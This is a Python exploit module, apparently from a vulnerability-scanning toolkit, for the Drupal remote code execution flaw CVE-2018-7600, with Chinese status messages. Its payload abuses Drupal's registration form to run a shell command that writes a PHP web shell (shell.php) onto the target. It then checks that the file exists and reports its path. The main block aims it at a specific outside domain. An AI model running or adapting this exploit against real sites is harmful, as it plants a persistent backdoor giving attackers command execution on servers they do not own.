#!/usr/bin/env python3

'''
name: CVE-2018-7600漏洞
description: CVE-2018-7600漏洞可执行任意命令
'''

import time
from app.lib.utils.request import request


class CVE_2018_7600_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
        }
        self.payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo " <?php @system($_POST["cmd"])?>" | tee shell.php'}

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            url = self.url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            r = request.post(url,  data = self.payload, headers = self.headers)
            check = request.get(self.url + '/shell.php', headers = self.headers)
            if check.status_code == 200:
                print ('存在CVE-2018-7600漏洞,shell文件路径为：'+ self.url +'/shell.php')
                return True
            else:
                print ('不存在CVE-2018-7600漏洞')
                return False
        except Exception as e:
            print(e)
            print ('不存在2018-7600漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2018_7600 = CVE_2018_7600_BaseVerify('https://www.tfzx.net')
    CVE_2018_7600.run()


